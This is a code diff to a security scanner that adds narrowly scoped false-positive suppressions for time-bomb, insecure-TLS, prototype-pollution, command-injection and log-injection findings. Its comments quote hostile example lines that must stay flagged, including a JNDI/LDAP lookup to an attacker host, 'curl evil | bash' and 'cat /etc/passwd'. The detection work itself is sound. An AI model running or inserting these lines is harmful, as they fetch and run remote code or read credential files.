@@ -1382,6 +1382,379 @@ def _match_is_emoji_combiner_zwj(line: str, match: str) -> bool:
     return bool(positions) and all(_is_emoji_combiner_zwj(line, p) for p in positions)
 
 
+# ────────────────────────────────────────────────────────────────────────
+# Theme-A doc-fence cluster (issues #76 umbrella + #77/#78/#80/#81/#83/#88).
+# Each discriminator below returns ``safe_literal`` (SUPPRESS) ONLY for the
+# provably-inert shape of its rule; the malicious sibling of the SAME rule
+# keeps firing (verified two-sided in tests/test_theme_a_markdown_fps.py).
+# No path/dir/file carve-out, no allowlist-exempt mechanism — each is keyed
+# on the matched CONTENT/language, re2-safe (no lookbehind/lookahead).
+# ────────────────────────────────────────────────────────────────────────
+
+
+# #77 — a TIME_BOMB match is a real delivery vector only when it carries a
+# CODE construct that gates execution on a clock: a ``Date`` read, a
+# ``setTimeout``/``setInterval`` scheduler, a ``cron``/``crontab`` entry, an
+# ``at`` job, a ``sleep`` delay, a timestamp comparison, or ANY call-paren
+# ``(``. English prose that merely MENTIONS a duration ("if a developer
+# pushes 5 commits in 10 minutes, the runs execute") has none of these — it
+# is inert regardless of the host file.
+_TIME_BOMB_CODE_CONSTRUCT_RE: Final[re.Pattern[str]] = re.compile(
+    r"\bDate\b"
+    r"|\bDate\.now\b"
+    r"|\bgetTime\b|\bgetMonth\b|\bgetFullYear\b|\bgetDate\b"
+    r"|\bsetTimeout\b|\bsetInterval\b"
+    r"|\bcron\b|\bcrontab\b"
+    r"|\btime\.(?:time|sleep|monotonic)\b"
+    r"|\bsleep\b"
+    r"|\bschedule\b|\bscheduler\b"
+    r"|\bactivation[_-]?date\b|\btrigger[_-]?(?:after|date|time)\b"
+    r"|\bdormant\b|\bsleeper\b|\blogic[_-]?bomb\b"
+    r"|\btimestamp\b|\bepoch\b|\bunix[_-]?time\b"
+    # any timestamp-style comparison against a 6+-digit literal
+    r"|(?:>|<|>=|<=|==|===)\s*\d{6,}"
+    # a 6+-digit literal compared against something
+    r"|\d{6,}\s*(?:>|<|>=|<=|==|===)"
+    # any call-paren — a literal code invocation, not prose
+    r"|\(",
+)
+
+
+def _is_inert_timebomb_prose(
+    fence_state: tuple[int, int, str] | None,
+    line: str,
+    match: str,
+) -> bool:
+    """#77 — True iff a TIME_BOMB match is OUT-OF-FENCE English prose with
+    NO code construct.
+
+    Gated on the ABSENCE of a code construct (not on the file being a doc),
+    so it is FN-safe even in SKILL.md: an English sentence about a duration
+    has no executable shape. A ``Date.now() > <ts>`` / ``setTimeout(payload,
+    …)`` / any call-paren ``(`` in the matched span or its line keeps the
+    finding visible (the construct survives the absence-check).
+    """
+    if fence_state is not None:
+        return False  # inside a fence — let the fence branch decide
+    hay = (match or "") + "\n" + (line or "")
+    return not _TIME_BOMB_CODE_CONSTRUCT_RE.search(hay)
+
+
+# #78 — INSECURE_TLS (``verify=False`` / ``rejectUnauthorized:false`` /
+# ``curl -k`` / …) can NEVER be a true positive in a markdown prose/table/
+# data-fence context: markdown cannot disable TLS. It IS a true positive
+# inside an EXECUTABLE code fence (```python / ```js / ```ts / …) on an
+# instruction-loadable surface, where the agent may run the snippet — so we
+# suppress ONLY when the match is NOT inside such a code fence.
+
+
+def _is_inert_insecure_tls_doc(
+    fence_state: tuple[int, int, str] | None,
+    rule_id: str,
+) -> bool:
+    """#78 — True iff an INSECURE_TLS match sits in a GFM-table row /
+    out-of-fence prose / DATA fence (json/yaml/toml/…), where TLS cannot be
+    disabled. A match inside a non-data code fence (```python / ```js /
+    ```ts / ```graphql / unlabeled / …) is NOT suppressed — there the author
+    must address it on an instruction-loadable surface (the same
+    ``fence_state`` guard ``_match_in_security_review_doc`` uses).
+    """
+    if rule_id != "INSECURE_TLS":
+        return False
+    if fence_state is None:
+        return True  # prose / table / heading — markdown can't disable TLS
+    return fence_state[2] in _DATA_LANGS  # a data fence is inert; a code fence is not
+
+
+# #80 / #83.2 — PROTOTYPE_POLLUTION is a JavaScript/TypeScript-only vuln
+# class (the JS prototype chain). A fenced block whose language is an
+# explicit NON-JS code language cannot host it; and a GFM-table-row /
+# inline-code mention of an API merely NAMED "merge" is not a JS
+# request-object assignment.
+_NON_JS_FENCE_LANGS: Final[frozenset[str]] = frozenset(
+    {
+        "graphql",
+        "gql",
+        "sql",
+        "proto",
+        "protobuf",
+        "python",
+        "py",
+        "go",
+        "golang",
+        "rust",
+        "rs",
+        "ruby",
+        "rb",
+        "java",
+        "kotlin",
+        "kt",
+        "scala",
+        "c",
+        "cpp",
+        "c++",
+        "cc",
+        "objc",
+        "csharp",
+        "cs",
+        "php",
+        "swift",
+        "elixir",
+        "ex",
+        "erlang",
+        "haskell",
+        "hs",
+        "clojure",
+        "lua",
+        "perl",
+        "r",
+        "julia",
+        "dart",
+    }
+)
+
+# JS prototype-pollution signal tokens. Their presence on the matched line
+# means the match is a genuine JS object-assignment shape (or a request-
+# object access), NOT an API-name mention — so it stays visible.
+_PROTO_POLLUTION_JS_SIGNAL_RE: Final[re.Pattern[str]] = re.compile(
+    r"__proto__|\bprototype\b|\bconstructor\b|req\.body|req\.query|"
+    r"request\.body|request\.query|userData|Object\.(?:assign|setPrototypeOf)|"
+    r"Reflect\.(?:set|defineProperty)"
+)
+
+
+def _is_inert_prototype_pollution(
+    fence_state: tuple[int, int, str] | None,
+    line: str,
+    rule_id: str,
+) -> bool:
+    """#80 + #83.2 — True iff a PROTOTYPE_POLLUTION match is categorically
+    inapplicable: either inside a fenced block tagged with a NON-JS code
+    language (#80 — graphql/sql/python/go/…), OR a GFM-table-row / inline-
+    code mention of a "merge"-named API with NO JS prototype-pollution
+    signal token on the line (#83.2).
+
+    A ```text/unlabeled/```js/```javascript/```ts fence is NOT in
+    ``_NON_JS_FENCE_LANGS`` → not suppressed (a mislabeled or genuine JS
+    fence stays visible). A line carrying ``__proto__`` / ``req.body`` /
+    ``Object.assign`` / … is a real shape and stays visible.
+    """
+    if rule_id != "PROTOTYPE_POLLUTION":
+        return False
+    if _PROTO_POLLUTION_JS_SIGNAL_RE.search(line or ""):
+        return False  # a real JS object-assignment / request-object access shape
+    # #80 — an explicit non-JS code fence cannot host the JS class.
+    if fence_state is not None and fence_state[2].lower() in _NON_JS_FENCE_LANGS:
+        return True
+    # #83.2 — a table row or an inline-code-only line is an API mention.
+    if fence_state is None and (_is_gfm_table_row(line) or _line_has_only_inline_code(line)):
+        return True
+    return False
+
+
+# #81 — SHELL_EXEC / CMD_INJECTION on the canonical SAFE subprocess shape:
+# ``subprocess.run([list-literal], …)`` with no ``shell=True`` and no string
+# interpolation. The same invariant ``_skillaudit_python_context`` already
+# encodes for real ``.py`` files; the markdown path does not recurse there,
+# so we re-derive it from the line.
+_SUBPROCESS_HEAD_RE: Final[re.Pattern[str]] = re.compile(
+    r"\bsubprocess\.(?:run|call|check_output|check_call|Popen)\s*\(\s*\["
+)
+# Interpolation / dynamic-argv markers that forfeit the safe-literal proof:
+# a shell-var, an f-string, ``+`` concat, ``.format`` / ``%`` formatting, or
+# an explicit ``shell=True``.
+_SUBPROCESS_DYNAMIC_RE: Final[re.Pattern[str]] = re.compile(
+    r"shell\s*=\s*True"
+    r"|\$\{|\$[A-Za-z_]"
+    r"|\bf['\"]"
+    r"|\.format\b"
+    r"|%\s*[\(\w]"
+    r"|\+",
+)
+# A list-literal that is all string literals + commas/whitespace (no nested
+# call, no identifier, no interpolation): the provably-static argv. Captures
+# the bracketed content greedily to the first ``]``.
+_SUBPROCESS_LIST_LITERAL_RE: Final[re.Pattern[str]] = re.compile(r"\[\s*(?P<argv>[^\]]*)\]")
+# A single quoted-string list element, e.g. ``"uv"`` or ``'run'``.
+_QUOTED_STR_ELEM_RE: Final[re.Pattern[str]] = re.compile(r"""^(?:"[^"]*"|'[^']*')$""")
+# Shell interpreters: an argv whose FIRST element is one of these is a shell
+# invocation (``subprocess.run(["sh", "-c", "<arbitrary>"])`` is semantically
+# ``shell=True`` — the second element is an arbitrary command string). Even a
+# fully-static such argv is NOT the provably-safe shape, so it stays visible.
+_SHELL_INTERPRETER_ARGV0: Final[frozenset[str]] = frozenset(
+    {"sh", "bash", "zsh", "dash", "ksh", "fish", "csh", "tcsh", "ash", "pwsh", "powershell", "cmd"}
+)
+# Code interpreters: a static argv ``["python", "-c", "<code>"]`` / ``["node",
+# "-e", …]`` / ``["perl", "-E", …]`` runs an arbitrary inline-code STRING —
+# semantically ``eval``/``shell=True`` even when fully static. Such an argv is
+# certified ONLY when the interpreter is NOT followed by an inline-eval flag
+# (so ``["uv","run","python","x.py"]`` / ``["python","x.py"]`` — a NAMED,
+# separately-scanned target — stays certified, but ``python -c`` does not).
+_CODE_INTERPRETER_ARGV0: Final[frozenset[str]] = frozenset(
+    {
+        "python", "python2", "python3", "pypy", "pypy3",
+        "node", "nodejs", "deno", "bun",
+        "perl", "ruby", "jruby", "php", "lua", "luajit",
+        "tclsh", "groovy", "elixir", "osascript", "rscript", "sed",
+    }
+)
+# Inline-code-eval flags that mean "the following element is code to execute".
+# Only consulted when the argv0 (or a wrapped argv0) IS a code interpreter, so
+# the overload with ordinary tool flags (``grep -e`` / ``cp -r``) never fires.
+_INLINE_CODE_FLAG: Final[frozenset[str]] = frozenset(
+    {"-c", "-e", "-E", "--eval", "--run", "-r", "-pe", "-ne", "-p", "--print"}
+)
+
+
+def _is_safe_literal_argv_subprocess(line: str) -> bool:
+    """#81 — True iff ``line`` invokes ``subprocess.run``/``Popen``/
+    ``check_output``/``check_call``/``call`` with a LIST-LITERAL first arg
+    whose elements are ALL string literals (no ``$VAR``/f-string/``+``/
+    ``.format``/``%``) AND the call has no ``shell=True`` AND the argv's first
+    element is NOT a shell interpreter.
+
+    This is the provably-safe subprocess shape. ``subprocess.run(cmd,
+    shell=True)`` / ``subprocess.run(f"curl {x}|sh", shell=True)`` /
+    ``subprocess.run([cmd_from_user])`` (a bare identifier element) /
+    ``subprocess.run(["sh", "-c", "<cmd>"])`` (argv0 is a shell interpreter —
+    semantically ``shell=True``) all carry a dynamic/shell marker → NOT
+    certified.
+    """
+    if not _SUBPROCESS_HEAD_RE.search(line):
+        return False
+    if _SUBPROCESS_DYNAMIC_RE.search(line):
+        return False  # shell=True / f-string / $VAR / + / .format / % anywhere on the call line
+    m = _SUBPROCESS_LIST_LITERAL_RE.search(line)
+    if m is None:
+        return False
+    argv = m.group("argv").strip()
+    if not argv:
+        return False  # empty list is not a meaningful exec; don't certify
+    # Every comma-separated element must be a plain quoted string literal.
+    elements: list[str] = []
+    for elem in argv.split(","):
+        elem = elem.strip()
+        if not elem:
+            continue  # trailing comma
+        if not _QUOTED_STR_ELEM_RE.match(elem):
+            return False  # a bare identifier / nested call / non-literal element
+        elements.append(elem)
+    if not elements:
+        return False
+    # Reject if the argv invokes an interpreter on an arbitrary code STRING —
+    # equivalent to shell=True/eval even with a fully-static argv:
+    #   * a SHELL interpreter ANYWHERE in the argv (``["sh","-c",…]`` and the
+    #     wrapped ``["env","bash","-c",…]`` / ``["xargs","sh","-c",…]``) — a
+    #     shell runs an arbitrary command string;
+    #   * a CODE interpreter (python/node/perl/ruby/php/…) FOLLOWED by an
+    #     inline-eval flag (``-c``/``-e``/``-E``/``--eval``/``-r``/…) — e.g.
+    #     ``python -c "<code>"`` / ``node -e "<code>"`` run arbitrary inline
+    #     code. A code interpreter with NO eval flag (``["uv","run","python",
+    #     "x.py"]`` / ``["python","x.py"]``) runs a NAMED, separately-scanned
+    #     target and stays certified.
+    basenames = [e[1:-1].strip().rsplit("/", 1)[-1].lower() for e in elements]
+    raw = [e[1:-1].strip() for e in elements]
+    for i, base in enumerate(basenames):
+        if base in _SHELL_INTERPRETER_ARGV0:
+            return False
+        if base in _CODE_INTERPRETER_ARGV0 and any(f in _INLINE_CODE_FLAG for f in raw[i + 1:]):
+            return False
+    return True
+
+
+# #83.3 — LOG_INJECTION ``${env:…}`` / ``$env:…`` is a log4shell-lookup
+# pattern, but the SAME ``${env:NAME}`` form is benign PowerShell variable
+# syntax. The genuinely-dangerous LOG_INJECTION shapes carry a JNDI / LDAP /
+# RMI / log4j / logger-sink corroborator; the bare ``${env:}`` mention does
+# not.
+_LOGINJECTION_ENV_VAR_RE: Final[re.Pattern[str]] = re.compile(r"\$\{?env:")
+_LOGINJECTION_CORROBORATOR_RE: Final[re.Pattern[str]] = re.compile(
+    r"jndi:|ldap:|rmi:|dns:|iiop:|corba:|nds:|"
+    r"\blog4j\b|\blog4shell\b|"
+    r"java\.naming|javax\.naming|com\.sun\.jndi|"
+    r"(?:log|logger|logging|console)\.(?:info|warn|warning|error|debug|log|critical|fatal)\s*\(",
+    re.IGNORECASE,
+)
+
+
+def _is_inert_env_var_log_injection(
+    lines: list[str],
+    line_idx: int,
+    match: str,
+    rule_id: str,
+) -> bool:
+    """#83.3 — True iff a LOG_INJECTION match is a PowerShell ``${env:…}`` /
+    ``$env:…`` variable mention with NO log4shell corroborator
+    (``jndi:``/``ldap:``/``rmi:``/``log4j``/a logger sink) within ±2 lines.
+
+    A real ``${jndi:ldap://attacker/x}`` carries the JNDI scheme; a
+    ``logger.info(req.body.x)`` carries a logger sink — both keep firing.
+    """
+    if rule_id != "LOG_INJECTION":
+        return False
+    if not _LOGINJECTION_ENV_VAR_RE.search(match or ""):
+        return False  # only the ``${env:`` / ``$env:`` form; jndi/ldap/etc. NOT touched
+    lo = max(0, line_idx - 2)
+    hi = min(len(lines) - 1, line_idx + 2)
+    window = "\n".join(lines[lo : hi + 1])
+    return not _LOGINJECTION_CORROBORATOR_RE.search(window)
+
+
+# #88 — CMD_INJECTION where the matched tokens are each inside SEPARATE
+# backtick inline-code spans on a prose line, with NO connecting shell
+# metacharacter (``|``, ``;``, ``&&``, ``$(``, ``>``). A backticked
+# bare-command-NAME list ("needs `curl`, `jq`, `openssl`, and `base64`") is a
+# documentation enumeration, not a command line.
+_SHELL_METACHAR_RE: Final[re.Pattern[str]] = re.compile(r"\||;|&&|\$\(|>")
+# A BARE command NAME: one word, no path ``/``, no ``.``, no space/args, no URL.
+# ``curl`` / ``jq`` / ``openssl`` / ``base64`` / ``python3`` / ``g++`` match;
+# ``cat /etc/passwd`` (space + ``/``), ``curl https://x`` (space), ``subprocess.run``
+# (``.``), ``/janitor-arm`` (``/``) do NOT.
+_BARE_COMMAND_NAME_RE: Final[re.Pattern[str]] = re.compile(r"^[A-Za-z][A-Za-z0-9_+-]*$")
+# Every backtick inline-code span on a line.
+_BACKTICK_SPAN_RE: Final[re.Pattern[str]] = re.compile(r"`([^`]+)`")
+
+
+def _is_inert_backtick_command_list(line: str, match: str, rule_id: str) -> bool:
+    """#88 — True iff a CMD_INJECTION match is a prose ENUMERATION of bare
+    command NAMES, each in its own backtick inline-code span (a dependency
+    list like ``needs \\`curl\\`, \\`jq\\`, \\`openssl\\`, and \\`base64\\`.``),
+    with NO connecting shell metacharacter.
+
+    Narrow by construction so a single command with arguments / a path / a URL
+    stays visible:
+      * the matched token sits inside backtick inline-code, AND
+      * the line carries at least TWO backtick spans (a genuine list, not a
+        single command mention), AND
+      * EVERY backtick span on the line is a single BARE command NAME
+        (``_BARE_COMMAND_NAME_RE`` — no ``/`` path, no ``.``, no space/args),
+        so one non-bare span (``\\`cat /etc/passwd\\``, ``\\`curl https://evil\\``,
+        ``\\`subprocess.run\\``, ``\\`sudo apt-get install X\\``) disqualifies the
+        whole line, AND
+      * neither the match nor the line carries a shell metacharacter
+        (``|``/``;``/``&&``/``$(``/``>`` — a real pipeline stays visible).
+
+    A single backticked command, a command with a sensitive path/secret-read
+    (``cat /etc/passwd``), a download (``curl https://evil``), or an injection
+    pipeline therefore all fall through to the normal safe_doc/keep handling
+    and STAY visible.
+    """
+    if rule_id != "CMD_INJECTION":
+        return False
+    if not match:
+        return False
+    if not _match_falls_inside_inline_code(line, match):
+        return False
+    if _SHELL_METACHAR_RE.search(match) or _SHELL_METACHAR_RE.search(line):
+        return False
+    spans = _BACKTICK_SPAN_RE.findall(line)
+    if len(spans) < 2:
+        return False  # a single backticked command is not an enumeration
+    if not all(_BARE_COMMAND_NAME_RE.match(s.strip()) for s in spans):
+        return False  # any args / path / url / dotted span disqualifies the line
+    return True
+
+
 def _certain_benign_literal(
     line: str,
     lines: list[str],
@@ -1404,6 +1777,57 @@ def _certain_benign_literal(
     Each branch is self-guarded so the same surface carrying a real
     threat is NOT suppressed. See the module section header above.
     """
+    # (#77) TIME_BOMB on out-of-fence English prose with NO code construct
+    #       (no Date/setTimeout/cron/sleep/at/timestamp-comparison/`()`). An
+    #       English sentence that merely mentions a duration is inert; a
+    #       `Date.now() > <ts>` / `setTimeout(payload, …)` / any call-paren
+    #       keeps the finding visible.
+    if rule_id == "TIME_BOMB" and _is_inert_timebomb_prose(fence_state, line, match):
+        return True
+
+    # (#78) INSECURE_TLS (`verify=False` / `rejectUnauthorized:false` /
+    #       `curl -k`) in a GFM table row / out-of-fence prose / DATA fence —
+    #       markdown cannot disable TLS. KEEPS firing inside an executable
+    #       code fence (```python / ```js / ```ts / …) on a loadable surface.
+    if _is_inert_insecure_tls_doc(fence_state, rule_id):
+        return True
+
+    # (#80 + #83.2) PROTOTYPE_POLLUTION is JS/TS-only — categorically
+    #       inapplicable inside a NON-JS code fence (graphql/sql/python/…) or
+    #       on a GFM-table-row / inline-code "merge"-named-API mention with no
+    #       JS prototype-pollution signal token (`__proto__`/`req.body`/…).
+    if _is_inert_prototype_pollution(fence_state, line, rule_id):
+        return True
+
+    # (#81) SHELL_EXEC / CMD_INJECTION on the provably-safe subprocess shape:
+    #       `subprocess.run([list-literal], …)` with no `shell=True` and no
+    #       string interpolation. `shell=True` / f-string / $VAR / + / .format
+    #       / % / a bare-identifier element keeps it visible. Gated on the
+    #       absence of a payload-construction / network sink in context.
+    if (
+        rule_id in {"SHELL_EXEC", "CMD_INJECTION"}
+        and _is_safe_literal_argv_subprocess(line)
+        and not _context_has_payload_sink(lines, line_idx, span=2)
+        and not _context_has_network_sink(lines, line_idx, span=2)
+    ):
+        return True
+
+    # (#83.3) LOG_INJECTION on a PowerShell `${env:…}` / `$env:…` variable
+    #       mention with NO log4shell corroborator (`jndi:`/`ldap:`/`rmi:`/
+    #       `log4j`/a logger sink) within ±2 lines. A real `${jndi:ldap://…}`
+    #       / `logger.info(req.body)` stays visible.
+    if _is_inert_env_var_log_injection(lines, line_idx, match, rule_id):
+        return True
+
+    # (#88) CMD_INJECTION on a bare command NAME inside its own backtick
+    #       inline-code span on a prose line with NO connecting shell
+    #       metacharacter (`|`/`;`/`&&`/`$(`/`>`) — a documentation
+    #       enumeration ("needs `curl`, `jq`, `openssl`"), not a command line.
+    #       A real `curl evil | bash` (or a backticked `\`curl x | sh\``) keeps
+    #       the metacharacter and stays visible.
+    if _is_inert_backtick_command_list(line, match, rule_id):
+        return True
+
     # (1) CRYPTO_THEFT "mnemonic" with NO crypto-wallet vocabulary in
     #     context → the English word "mnemonic" (a memory aid), not a
     #     BIP-39 seed phrase. e.g. "Action letters are mnemonics".
